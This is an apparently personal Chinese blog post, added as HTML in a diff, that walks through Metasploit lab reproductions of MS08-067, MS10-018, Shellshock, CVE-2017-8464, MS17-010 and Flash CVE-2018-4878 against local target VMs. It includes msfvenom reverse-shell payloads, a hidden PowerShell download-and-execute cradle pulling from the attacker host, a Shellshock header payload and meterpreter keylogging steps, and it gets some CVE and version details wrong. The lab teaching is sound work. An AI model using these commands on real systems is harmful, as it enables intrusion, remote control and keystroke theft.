@@ -1,0 +1,298 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Chasing Dreams | Chasing Dreams</title><meta name="author" content="Delusional RS6"><meta name="copyright" content="Delusional RS6"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Kali MSF（The Metasploit Framework）启动方式msfconsole （-q）加-q在后台静默启动，启动完成后命令行显示msf&gt;msfconsole -h 查看其它使用选项 常用命令msf &gt; help 查看帮助信息msf &gt; back 返回命令msf &gt; exit 退出metasploitmsf &gt; banner 查看metasploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Chasing Dreams">
+<meta property="og:url" content="http://example.com/2024/06/26/Kali%20MSF/index.html">
+<meta property="og:site_name" content="Chasing Dreams">
+<meta property="og:description" content="Kali MSF（The Metasploit Framework）启动方式msfconsole （-q）加-q在后台静默启动，启动完成后命令行显示msf&gt;msfconsole -h 查看其它使用选项 常用命令msf &gt; help 查看帮助信息msf &gt; back 返回命令msf &gt; exit 退出metasploitmsf &gt; banner 查看metasploit">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2024-06-26T07:54:16.616Z">
+<meta property="article:modified_time" content="2024-06-15T02:16:58.652Z">
+<meta property="article:author" content="Delusional RS6">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/06/26/Kali%20MSF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Chasing Dreams',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-06-15 10:16:58'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Chasing Dreams"><span class="site-name">Chasing Dreams</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-06-26T07:54:16.616Z" title="发表于 2024-06-26 15:54:16">2024-06-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-15T02:16:58.652Z" title="更新于 2024-06-15 10:16:58">2024-06-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Kali-MSF（The-Metasploit-Framework）"><a href="#Kali-MSF（The-Metasploit-Framework）" class="headerlink" title="Kali MSF（The Metasploit Framework）"></a>Kali MSF（The Metasploit Framework）</h1><p>启动方式<br>msfconsole （-q）加-q在后台静默启动，启动完成后命令行显示msf&gt;<br><img src="/image_1.edd4c722.png" alt="|300"><br>msfconsole -h 查看其它使用选项</p>
+<p>常用命令<br>msf &gt; help 查看帮助信息<br>msf &gt; back 返回命令<br>msf &gt; exit 退出metasploit<br>msf &gt; banner 查看metasploit版本信息及漏洞模块数量<br>show options 检查目标信息（required中yes为必填项）<br><img src="/image_2.699e0bf2.png"><br>info 查看模块作者和许可信息漏洞参考（CVE、BID等）<br>msf &gt; jobs -h 查看后台的工作<br>kill 杀死正在运行的进程<br>msf &gt; search *** 基于正则表达式的搜索功能</p>
+<p>&#x3D;&#x3D;（可以将以下关键字组合使用搜索来缩小返回结果的范围）&#x3D;&#x3D;</p>
+<p>msf &gt; search name：*** 进行名称搜索<br>msf &gt; search platform：*** 根据特定平台进行搜索<br>msf &gt; search type：*** 根据模块类型进行搜索<br>msf &gt; search author：*** 根据作者姓名进行搜索<br>setg\unsetg 可以对show options中的选项进行配置（带g为全局配置global）<br>use 使用漏洞<br>exploit 开始攻击</p>
+<h1 id="MSF-漏洞复现"><a href="#MSF-漏洞复现" class="headerlink" title="MSF 漏洞复现"></a>MSF 漏洞复现</h1><h2 id="MS08-067"><a href="#MS08-067" class="headerlink" title="MS08-067"></a><em>MS08-067</em></h2><p>漏洞简介</p>
+<p>受影响版本：Windows 2000&#x2F;XP&#x2F;Server 2003&#x2F;Vista&#x2F;Server 2008&#x2F;7 Pro-beta<br>如果用户在受影响的系统上收到特制的RPC请求，则可能导致攻击者在未经允许身份验证的而情况下利用此漏洞运行任意代码，实现远程代码执行。</p>
+<p>解决方案：通过防火墙来阻止攻击</p>
+<p>漏洞利用</p>
+<p>1.在kali中打开命令行，并输入msfconsole进入msf终端<br>2.查找ms08-067漏洞，并利用模块<br><img src="/image_3.a2969f24.png"><br>3.使用攻击模块<br>use exploit&#x2F;windows&#x2F;smb&#x2F;ms08-067 或 use 0（查找出来的模块序号为0）<br><img src="/image_4.d2099583.png"><br><img src="/image_5.d0e07a04.png"><br>4.查看该攻击模块下所需的配置信息，options 或者show options 都可以<br><img src="/image_6.e103f99e.png"><br>5.设置payload<br>show payloads<br>set payload windows&#x2F;meterpreter&#x2F;bind_tcp<br><img src="/image_7.d14f4826.png"><br>6.设置靶机地址，将RHOSTS_IP设置为目标靶机IP<br>set RHOSTS x.x.x.x<br><img src="/image_8.66f8410c.png"><br>7.查看targets，并将targets设置为目标靶机系统版本<br>show targets<br>set targets 34<br><img src="/image_9.96cdc9b9.png"><br><img src="/image_10.f7be79b6.png"><br>8.确认配置信息<br><img src="/image_11.13a7458e.png"><br>9.执行exploit进行攻击<br><img src="/image_12.2f8825d4.png"><br>10.漏洞利用验证<br><img src="/image_13.ccfd6279.png"><br>11.监听键盘记录<br>  1)在meterperter下使用ps查看靶机进程<br><img src="/image_14.ee1440d4.png"><br>  2）找到要监听键盘的进程，并进行迁移 migrate xxx<br><img src="/image_15.6496fa85.png"><br>  3）使用keyscan_start开启键盘记录（keyscan_stop关闭）<br><img src="/image_16.56d922f5.png"><br>  4）在xp下对应程序输入任意字符后，在meterpreter使用keyscan_dump查看键盘记录内容<br><img src="/image_17.ddbf4a77.png"><br><img src="/image_18.29db519b.png"></p>
+<h2 id="MS10-018"><a href="#MS10-018" class="headerlink" title="MS10-018"></a><em>MS10-018</em></h2><p>漏洞简介</p>
+<p>MS10-018是IE浏览器上的漏洞，主要危害Internet Explorer 6~7，攻击者可以通过该漏洞获取受害主机的控制权。</p>
+<p>扩展资料：<strong><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/security-updates/securitybulletins/2010/ms10-018">https://learn.microsoft.com/zh-cn/security-updates/securitybulletins/2010/ms10-018</a></strong></p>
+<p>漏洞利用</p>
+<p>1.msfconsole进入msf终端<br>2.查找ms10-018漏洞模块<br>3.use exploit&#x2F;windows&#x2F;browser&#x2F;ms10_018_ie_behaviors<br><img src="/image_19.438df82a.png"><br>4.set srvhost x.x.x.x (x.x.x.x)为监听设备ip，不是靶机ip<br><img src="/image_20.da73c980.jpg"><br>&#x3D;&#x3D;（如果不设置URIPATH就会随机生成URL路径)&#x3D;&#x3D;<br><img src="/image_21.81cc52d4.jpg"><br>5.在靶机设备使用ie访问<a target="_blank" rel="noopener" href="http://x.x.x.x:8080/xxxx%EF%BC%9B%E8%AE%BF%E9%97%AE%E5%90%8Eie%E9%97%AA%E9%80%80%EF%BC%8Cmsf%E6%94%B6%E5%88%B0%E5%AF%B9%E5%BA%94session%E4%BC%9A%E8%AF%9D">http://x.x.x.x:8080/xxxx；访问后ie闪退，msf收到对应session会话</a><br><img src="/image_22.f2a83128.png"><br>6.在msf查看session -l，根据结果使用session -i # 进入会话，并进行漏洞利用验证<br><img src="/image_23.8813c96e.png"></p>
+<p>&#x3D;&#x3D;bind和reverse的区别&#x3D;&#x3D;<br>&#x3D;&#x3D;bind正向攻击，有目标进行攻击，主动建立会话&#x3D;&#x3D;<br>&#x3D;&#x3D;reverse反向攻击，等别人访问来建立会话，相对bind较为安全&#x3D;&#x3D;<br>&#x3D;&#x3D;两种攻击方式中被攻击目标没有明显感知&#x3D;&#x3D;</p>
+<h2 id="Bash-Shellshock-CVE-2014-6217（破壳）"><a href="#Bash-Shellshock-CVE-2014-6217（破壳）" class="headerlink" title="Bash Shellshock CVE-2014-6217（破壳）"></a><em>Bash Shellshock CVE-2014-6217（破壳）</em></h2><p>漏洞简介</p>
+<p>Shellshock的原理是利用了Bash在导入环境变量函数时所触发的漏洞，启动Bash的时候，他不但会导入函数，而且也会把函数后面的命令一并执行。在有些CGI脚本的设计过程中，数据是通过环境变量来传递的，这就给了数据提供者利用Shellshock漏洞的机会。<br>简单按理说就是由于服务器的cgi脚本调用了bash命令，由于bash版本过低，攻击者把有害的数据写入环境变量，传到服务器，触发服务器运行Bash脚本，完成攻击。</p>
+<p>漏洞原理</p>
+<p>该bash使用的环境变量通过或函数名称来调用，导致楼的的问题点是一（）{开头定义的环境变量在命令ENV中解析成函数后，bsah执行并未退出，而是继续解析并执行shell命令。</p>
+<p>漏洞利用</p>
+<p>1.环境搭建</p>
+<p>1）docker下搜索该镜像 docker search CVE-2014-6271<br><img src="/image_24.4b0db853.png"><br>2）docker pull vulnerables&#x2F;cve-2014-6271<br>3）docker run -d -p **:80 container-name<br>4）dock ps 查看容器是否启动，并用浏览器访问ip：port<br><img src="/image_25.29d7c91a.png"></p>
+<p>2.漏洞攻击<br>使用hackbar发送http请求，将payload负载User-Agent中执行，随后访问&#x2F;cgi-bin&#x2F;vulnerable<br>User-Agent: <strong>() { foo; }; echo Content-Type: text&#x2F;plain; echo; &#x2F;usr&#x2F;bin&#x2F;id</strong><br><img src="/image_26.4eb0d6e2.png"><br>3.使用msf复现漏洞</p>
+<p>1）search shellshock 查找shellshock漏洞利用模块<br>2）use exploit&#x2F;multi&#x2F;http&#x2F;apache_mod_cgi_bash_env_exec 利用漏洞利用模块<br><img src="/image_27.228b6c57.png"><br>3）options 查看设置参数<br><img src="/image_28.026e9a79.png"><br>4）set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp 设置漏洞利用payload<br>5）set rhosts x.x.x.x 设置靶机ip<br>6）set rport 8086 设置靶机ip端口<br>7）set TARGETURI &#x2F;cgi-bin&#x2F;vulnerable 设置目标uri，根据漏洞路径设置<br><img src="/image_29.cb053b42.png"><br><img src="/image_30.fb12b9df.png"><br>8）options确认配置参数，check 查看是否存在漏洞<br><img src="/image_31.df3cca94.png"><br>&#x3D;&#x3D;若攻击失败 端口被占用则需要设置其他lport&#x3D;&#x3D;<br><img src="/image_32.af1df100.png"><br>set lport 4445，然后执行exploit，并进行验证<br><img src="/image_33.a47fc23c.png"></p>
+<h2 id="远程命令执行漏洞CVE-2017-8464（震网三代）"><a href="#远程命令执行漏洞CVE-2017-8464（震网三代）" class="headerlink" title="远程命令执行漏洞CVE-2017-8464（震网三代）"></a><em>远程命令执行漏洞CVE-2017-8464（震网三代）</em></h2><p>漏洞描述</p>
+<p>2017年6月13日，微软官方发布编号为CVE-2017-8464的高危漏洞公告，官方介绍Windows系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统。<br>Windows系统使用二进制解析.LNK文件，当恶意二进制代码被系统识别执行时即可实现远程代码执行，由于是在explorer.exe进程中运行，所以 Load 进内存时与当前用户具有相同权限。攻击者利用这一解析过程将包含恶意二进制的代码添加到可移动驱动器（或远程共享过程中），受害者使用powershell解析 .LNK 文件后即被黑客所控制。<br>功利用此漏洞的攻击者可能会获得与本地用户相同的用户权限。</p>
+<p>影响版本<br>windows 7-10 windows server 2008-2016&#x3D;&#x3D;（目前win10专业版无法实现）&#x3D;&#x3D;</p>
+<p>漏洞利用</p>
+<p>1.在kali下使用msfvenom生成一个反弹shell<br>&#x3D;&#x3D;msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;10.0.0.157 lport&#x3D;4444 -f psh-reflection &gt; ~&#x2F;magedu.ps1&#x3D;&#x3D;<br><img src="/image_34.18d07d5b.png"><br>2.将生成的magedu.ps1拷贝到&#x2F;var&#x2F;www&#x2F;html目录下<br>&#x3D;&#x3D;cp magedu.ps1 &#x2F;var&#x2F;www&#x2F;html&#x3D;&#x3D;<br>3.在kali中启用apache服务<br>&#x3D;&#x3D;service apache2 start&#x3D;&#x3D;<br>4.在windows中访问10.0.0.157<br><img src="/image_35.408585a5.png"><br>5.访问目录下的magedu.ps1<br><img src="/image_36.dee3cfc6.png"><br>6.在靶机上创建一个快捷方式<br>&#x3D;&#x3D;powershell -windowstyle hidden -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://10.0.0.157/magedu.ps1');test.ps1%22==">http://10.0.0.157/magedu.ps1&#39;);test.ps1&quot;==</a><br><img src="/image_37.92d1f7a8.png"><br>7.在kali下创建监听反射shell<br>msfconsole<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br>set LHOST 10.0.0.157<br><img src="/image_38.95676517.png"><br><img src="/image_39.38081211.png"><br><img src="/image_40.338ffbd3.png"><br>8.执行exploit开启监听，并在windows上运行刚才创建的powershell快捷方式<br><img src="/image_41.0e667b93.png"></p>
+<h2 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a><em>MS17-010</em></h2><p>漏洞简介</p>
+<p>永恒之蓝，爆发于WannaCry勒索病毒的诞生，改病毒是不法分子利用NSA（National Security Agency，美国国家安全局）泄露的漏洞“EternalBlue”（永恒之蓝）进行改造而成。该漏洞可以通过TCP的139和445端口，攻击windows的SMB服务，造成远程代码执行。<br>MS17-010漏洞主要针对windows7及以前的操作系统</p>
+<p>漏洞利用</p>
+<p>利用条件（原版win7）</p>
+<p>  防火墙必须允许SMB流量出入</p>
+<p>  目标必须使用SMBv1协议</p>
+<p>  目标必须缺少MS17-010补丁</p>
+<p>  目标必须允许匿名IPC$和管道名</p>
+<p>  （msdn下载的镜像默认满足2、3）</p>
+<p>环境准备</p>
+<p>关闭 ‘限制对命令管道和共享的匿名访问’，禁用后重启生效；<br><img src="/image_42.aec51ef9.png"><br>关闭系统防火墙<br><img src="/image_43.780c87d7.png"><br>漏洞复现<br>msfconsole<br>search ms17-010<br><img src="/image_44.1855e3ff.png"><br>  use 0<br>  set rhosts 10.0.0.159靶机<br><img src="/image_45.87345696.png"><br>  exploit<br><img src="/image_46.82499644.png"><br>  use 1<br>  set rhosts 10.0.0.159靶机<br>  exploit<br><img src="/image_47.a8ee2458.png"><br>  use 2 —-option选项中command配置攻击后返回command结果<br>  set rhosts 10.0.0.159<br>  set command ipconfig<br><img src="/image_48.7c765bf9.png"><br>  exploit<br><img src="/image_49.633b2944.png"><br>  use 3<br>  set rhosts 10.0.0.159靶机<br>  exploit<br><img src="/image_50.4539dd40.png"><br>扩展内容<br><img src="/image_51.d3af654a.png"></p>
+<table>
+<thead>
+<tr>
+<th>结果</th>
+<th>0、1两种方式可以直接获取meterpreter命令行</th>
+<th>2返回命令执行结果，3只能用于扫描</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>条件</td>
+<td>0、3不需要开启共享</td>
+<td>需要开启共享</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>漏洞模块</th>
+<th>防火墙必须允许SMB流量出入</th>
+<th>目标必须使用SMBv1协议</th>
+<th>目标必须缺少MS17-010补丁</th>
+<th>目标必须允许匿名IPC$和管道名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0 exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td></td>
+</tr>
+<tr>
+<td>1 exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+</tr>
+<tr>
+<td>2 auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+</tr>
+<tr>
+<td>3 auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</td>
+<td>✓</td>
+<td>✓</td>
+<td>✓</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>漏洞修复</p>
+<p>1.补丁<br>2.关闭SMB功能--业务不需要时可以关闭，理想环境下实现<br>3.外围安全设备实现防护<br>4.关闭445端口--业务不需要，135、137、139、443、445<br>5.访问控制，在防火墙上添加白名单（仅允许xxx访问）</p>
+<h2 id="Flash漏洞-CVE-2018-4878"><a href="#Flash漏洞-CVE-2018-4878" class="headerlink" title="Flash漏洞 CVE-2018-4878"></a><em>Flash漏洞 CVE-2018-4878</em></h2><p>漏洞简介</p>
+<p>2018年2月1号，adobe官方发布安全通报（APSA18-01），声明adobe Flash 28.0.0.137及其之前的版本，存在高位漏洞（CVE-2018-4878）<br>攻击者通过构造特殊的flash连接，当用户用浏览器&#x2F;邮件&#x2F;office访问此flash链接时，会被“远程代码执行”，并且直接被getshell。</p>
+<p>参考链接：_<a target="_blank" rel="noopener" href="https://blog.51cto.com/chenxinjie/2093653">https://blog.51cto.com/chenxinjie/2093653</a></p>
+<p>影响版本：</p>
+<table>
+<thead>
+<tr>
+<th>产品</th>
+<th>版本</th>
+<th>平台</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>adobe flash player桌面运行时</td>
+<td>28.0.0.137及更早版本</td>
+<td>Windows，Macintosh</td>
+</tr>
+<tr>
+<td>适用于Google chrome的adobe flash player</td>
+<td>28.0.0.137及更早版本</td>
+<td>Windows，Macintosh，Linux和chrome操作系统版本</td>
+</tr>
+<tr>
+<td>适用于mircosoft edge和internet explorer 11的adobe flash player</td>
+<td>28.0.0.137及更早版本</td>
+<td>windows 10和8.1</td>
+</tr>
+<tr>
+<td>adobe flash player桌面运行时</td>
+<td>28.0.0.137及更早版本</td>
+<td>linux</td>
+</tr>
+</tbody></table>
+<p>漏洞利用</p>
+<p>漏洞环境</p>
+<table>
+<thead>
+<tr>
+<th>攻击机：kali</th>
+<th>靶机：win7 sp3</th>
+<th>exp：cve-2018-4878.py</th>
+<th>flash：flashplayer_avtivex_28.0.0.137.exe</th>
+</tr>
+</thead>
+</table>
+<p>攻击流程</p>
+<p>1.kali中使用msfvenom生成漏洞利用代码<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;10.0.0.157 lport&#x3D;4445 -f python&gt;magedu_shellcode.txt<br><img src="/image_52.f4fb3cfe.png"><br>2.查看生成的文件<br><img src="/image_53.0fec14ed.png"><br>3.修改CVE-8-4878-master文件夹中的cve-2018-4878.py，替换该字段<br><img src="/image_54.7dfe9dd2.png"><br>4.修改cve-2018-4878.py文件中的文件生成路径为自己的路径，并将cve-2018-4878-master文件夹复制到kali root目录下<br><img src="/image_55.0c29084e.png"><br>5.kali root目录下python2 cve-2018-4878.py 使用python执行修改完的文件，此目录下产生.swf和.html两个文件<br><img src="/image_56.27398ec1.png"><br>6.开启apache服务，并将生成的两个文件copy到apache服务目录下（让目标访问到生成的目录文件）<br>server apache2 start<br>cp &#x2F;root&#x2F;cve-2018-4878&#x2F;* &#x2F;var&#x2F;www&#x2F;html<br><img src="/image_57.27670fbd.png"><br>7.kali上开启监听<br>msfconsole<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;meterpreter&#x2F;reverser_tcp<br>set lhost 10.0.0.157<br>set lport 4445 &#x2F;&#x2F;lport和lhost要与生成的shellcode文件中一致<br>exploit<br><img src="/image_58.98370f57.png"><br><img src="/image_59.b8ee0920.png"><br>8.win7中安装flash插件，并在ie中访问生成的index2.html页面<br><img src="/image_60.eed31a97.png"><br><img src="/image_61.9e2a297c.png"><br>9.kali获取meterpreter终端，并测试<br><img src="/image_62.4858da69.png"></p>
+<h2 id="MSF攻击流程"><a href="#MSF攻击流程" class="headerlink" title="MSF攻击流程"></a><em>MSF攻击流程</em></h2><p>1.输入msfconsole进入msf终端<br>2.search查找对应的漏洞利用模块<br>3.use使用查找的漏洞利用模块<br>4.set设置options需要配置参数<br>5.exploit&#x2F;run开始攻击<br>6.getshell</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Delusional RS6</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/06/26/Kali%20MSF/">http://example.com/2024/06/26/Kali%20MSF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Chasing Dreams</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/06/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title=""><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/2024/06/26/%E6%9C%AA%E5%91%BD%E5%90%8D/" title=""><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info"></div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Delusional RS6</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kali-MSF%EF%BC%88The-Metasploit-Framework%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">Kali MSF（The Metasploit Framework）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">MSF 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MS08-067"><span class="toc-number">2.1.</span> <span class="toc-text">MS08-067</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MS10-018"><span class="toc-number">2.2.</span> <span class="toc-text">MS10-018</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash-Shellshock-CVE-2014-6217%EF%BC%88%E7%A0%B4%E5%A3%B3%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">Bash Shellshock CVE-2014-6217（破壳）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2017-8464%EF%BC%88%E9%9C%87%E7%BD%91%E4%B8%89%E4%BB%A3%EF%BC%89"><span class="toc-number">2.4.</span> <span class="toc-text">远程命令执行漏洞CVE-2017-8464（震网三代）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MS17-010"><span class="toc-number">2.5.</span> <span class="toc-text">MS17-010</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flash%E6%BC%8F%E6%B4%9E-CVE-2018-4878"><span class="toc-number">2.6.</span> <span class="toc-text">Flash漏洞 CVE-2018-4878</span></a></li><li 